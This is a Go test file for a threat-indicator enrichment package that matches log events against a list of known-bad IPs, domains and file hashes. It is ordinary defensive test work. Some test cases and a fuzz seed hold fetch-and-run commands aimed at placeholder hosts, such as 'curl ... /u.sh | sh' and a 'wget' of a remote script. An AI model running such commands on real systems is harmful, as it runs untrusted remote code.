package indicators

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"

	"github.com/kenzietann/omamori/internal/event"
)

const hash = "9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08"

const good = "indicators:\n  - type: ip\n    value: 203.0.113.80\n    note: drop server\n  - type: ip\n    value: '2001:db8::bad'\n" +
	"  - type: domain\n    value: Bad.Example.Test.\n  - type: sha256\n    value: " + hash + "\n"

func marked(t *testing.T, fields map[string]string) map[string]string {
	t.Helper()
	list, err := Parse([]byte(good))
	if err != nil {
		t.Fatal(err)
	}
	if list.Len() != 4 {
		t.Fatalf("%d indicators", list.Len())
	}
	list.Enrich([]event.Event{{Fields: fields}})

	return fields
}

func TestEventsThatNameAnIndicator(t *testing.T) {
	cases := []struct {
		name               string
		in                 map[string]string
		value, kind, where string
	}{
		{"destination address", map[string]string{"src_ip": "10.0.2.30", "dst_ip": "203.0.113.80"}, "203.0.113.80", TypeIP, "dst_ip"},
		{"source address", map[string]string{"src_ip": "203.0.113.80"}, "203.0.113.80", TypeIP, "src_ip"},
		{"IPv4 written as IPv6", map[string]string{"dst_ip": "::ffff:203.0.113.80"}, "203.0.113.80", TypeIP, "dst_ip"},
		{"IPv6 written long", map[string]string{"dst_ip": "2001:db8:0:0:0:0:0:bad"}, "2001:db8::bad", TypeIP, "dst_ip"},
		{"address inside a command", map[string]string{"command": "curl -fsSL http://203.0.113.80/u.sh | sh"}, "203.0.113.80", TypeIP, "command"},
		{"address at the end of a sentence", map[string]string{"command": "echo 203.0.113.80."}, "203.0.113.80", TypeIP, "command"},
		{"address inside a URL", map[string]string{"url": "/redirect?to=http://203.0.113.80:8080/x"}, "203.0.113.80", TypeIP, "url"},
		{"the domain itself", map[string]string{"dns_query": "bad.example.test"}, "bad.example.test", TypeDomain, "dns_query"},
		{"a name under the domain", map[string]string{"tls_sni": "CDN.a.Bad.Example.Test"}, "bad.example.test", TypeDomain, "tls_sni"},
		{"domain inside a command", map[string]string{"command": "wget -qO- https://dl.bad.example.test/i.sh"}, "bad.example.test", TypeDomain, "command"},
		{"file hash", map[string]string{"sha256": strings.ToUpper(hash)}, hash, TypeSHA256, "sha256"},
	}
	for _, testCase := range cases {
		t.Run(testCase.name, func(t *testing.T) {
			got := marked(t, testCase.in)
			if got[Field] != testCase.value || got[TypeField] != testCase.kind || got[WhereField] != testCase.where {
				t.Errorf("marked as %q (%s) in %s", got[Field], got[TypeField], got[WhereField])
			}
		})
	}
}

func TestEventsThatDoNotNameAnIndicator(t *testing.T) {
	cases := map[string]map[string]string{
		"another address":                          {"dst_ip": "203.0.113.81", "src_ip": "10.0.2.30"},
		"an address that only starts the same":     {"command": "curl http://203.0.113.800/x"},
		"an address that only ends the same":       {"command": "ping 1203.0.113.80"},
		"the address as the end of eight numbers":  {"command": "echo 9.9.9.9.203.0.113.80"},
		"the address as the end of five numbers":   {"command": "echo 1.203.0.113.80"},
		"the address as the start of five numbers": {"url": "/v/203.0.113.80.1/x"},
		"a longer name that ends like the domain":  {"dns_query": "notbad.example.test"},
		"the parent of the domain":                 {"dns_query": "example.test"},
		"the domain as the start of another":       {"http_host": "bad.example.test.evil.example"},
		"another hash":                             {"sha256": strings.Repeat("a", 64)},
		"an address in a field that is not read":   {"message": "connect to 203.0.113.80", "user": "203.0.113.80"},
		"nothing at all":                           {},
		// A log line can carry any field. It must not be able to say that something is, or is not, known to be bad.
		"a mark that came from the log": {Field: "203.0.113.80", TypeField: "ip", WhereField: "dst_ip", "dst_ip": "198.51.100.1"},
	}
	for name, fields := range cases {
		t.Run(name, func(t *testing.T) {
			got := marked(t, fields)
			for _, field := range []string{Field, TypeField, WhereField} {
				if value, found := got[field]; found {
					t.Errorf("%s is %q", field, value)
				}
			}
		})
	}
}

func TestNoListChangesNothing(t *testing.T) {
	var list *List
	fields := map[string]string{"dst_ip": "203.0.113.80", Field: "from the log"}
	list.Enrich([]event.Event{{Fields: fields}, {}})
	if fields[Field] != "from the log" || list.Len() != 0 {
		t.Fatal("a missing list changed an event")
	}
}

func TestListsThatMustBeRefused(t *testing.T) {
	cases := map[string]string{
		"not yaml":                      "indicators: [",
		"empty":                         "",
		"no entries":                    "indicators: []",
		"unknown key":                   "indicators:\n  - type: ip\n    value: 1.2.3.4\n    score: 9\n",
		"unknown type":                  "indicators:\n  - type: url\n    value: http://x.example.test/\n",
		"no type":                       "indicators:\n  - value: 1.2.3.4\n",
		"address is a range":            "indicators:\n  - type: ip\n    value: 10.0.0.0/8\n",
		"address is a name":             "indicators:\n  - type: ip\n    value: bad.example.test\n",
		"domain is one label":           "indicators:\n  - type: domain\n    value: localhost\n",
		"domain is a URL":               "indicators:\n  - type: domain\n    value: http://bad.example.test/x\n",
		"domain with a star":            "indicators:\n  - type: domain\n    value: '*.example.test'\n",
		"hash too short":                "indicators:\n  - type: sha256\n    value: abc123\n",
		"hash of another kind":          "indicators:\n  - type: sha256\n    value: " + strings.Repeat("g", 64) + "\n",
		"one bad entry among good ones": good + "  - type: ip\n    value: not-an-address\n",
	}
	for name, text := range cases {
		t.Run(name, func(t *testing.T) {
			if _, err := Parse([]byte(text)); !errors.Is(err, ErrInvalid) {
				t.Fatalf("error is %v, want ErrInvalid", err)
			}
		})
	}
}

func TestLoad(t *testing.T) {
	folder := t.TempDir()
	path := filepath.Join(folder, "indicators.yml")
	os.WriteFile(path, []byte(good), 0o600)
	if list, err := Load(path); err != nil || list.Len() != 4 {
		t.Fatalf("%v", err)
	}
	for _, bad := range []string{filepath.Join(folder, "missing.yml"), folder} {
		if _, err := Load(bad); !errors.Is(err, ErrInvalid) {
			t.Errorf("%s gave %v", filepath.Base(bad), err)
		}
	}
}

func FuzzEnrich(f *testing.F) {
	f.Add("curl http://203.0.113.80/u.sh | sh", "cdn.bad.example.test")
	f.Add("....1.2.3.4.5.6.7.8", "a.-b..c")
	list, err := Parse([]byte(good))
	if err != nil {
		f.Fatal(err)
	}
	f.Fuzz(func(t *testing.T, text, name string) {
		fields := map[string]string{"command": text, "url": text, "dns_query": name, "dst_ip": name, "sha256": text}
		list.Enrich([]event.Event{{Fields: fields}})
		value, found := fields[Field]
		if !found {
			return
		}
		// Whatever the text was, the mark is one of the four entries of the list, and never text from the event.
		if value != "203.0.113.80" && value != "2001:db8::bad" && value != "bad.example.test" && value != hash {
			t.Fatalf("marked with %q, which is not in the list", value)
		}
	})
}
